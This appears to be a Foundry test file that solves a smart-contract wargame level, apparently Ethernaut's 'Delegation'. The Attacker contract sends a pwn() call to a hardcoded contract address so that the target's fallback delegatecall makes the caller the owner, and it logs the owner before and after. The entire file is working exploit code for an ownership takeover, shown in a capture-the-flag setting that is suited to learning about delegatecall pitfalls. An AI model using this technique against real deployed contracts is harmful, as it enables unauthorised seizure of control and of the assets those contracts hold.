// SPDX-Licence-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "instances/IDelegation.sol";

contract Attacker is Test {
    Delegation instance = Delegation(0x775F1CE0abe6a98ed568F526CA947a4B25e69aa6);

    function test() external {
        emit log_named_address("Initial Owner", instance.owner());
        (bool success, ) = address(instance).call(abi.encodeWithSignature("pwn()"));
        require(success, "Call failed");
        emit log_named_address("New Owner", instance.owner());
    }
}